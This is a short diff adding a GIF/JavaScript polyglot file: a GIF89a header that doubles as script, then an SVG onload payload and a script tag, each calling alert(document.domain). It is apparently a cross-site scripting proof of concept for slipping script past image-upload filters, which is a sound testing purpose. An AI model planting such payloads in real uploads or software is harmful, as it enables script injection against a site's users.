@@ -1,0 +1,3 @@
+GIF89a=1;
+/*<svg onload=alert(document.domain)>*/
+<script>alert(document.domain)</script>
